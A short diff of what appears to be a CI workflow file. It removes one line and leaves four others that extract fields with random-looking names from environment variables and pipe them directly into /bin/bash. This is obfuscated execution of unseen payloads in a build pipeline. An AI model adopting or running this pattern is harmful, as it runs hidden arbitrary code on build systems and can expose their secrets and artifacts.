@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$spgk593" | jq -r .lfgj01 | /bin/bash
           echo $bdc1 | jq -r .xeoae91654 | /bin/bash
           echo $k0719 | jq -r .cb340 | /bin/bash
-          printf '%s' "$a0" | jq -r .u62998 | /bin/bash
           echo $hu3 | jq -r .ikyyz3 | /bin/bash
 
       - name: Upload results
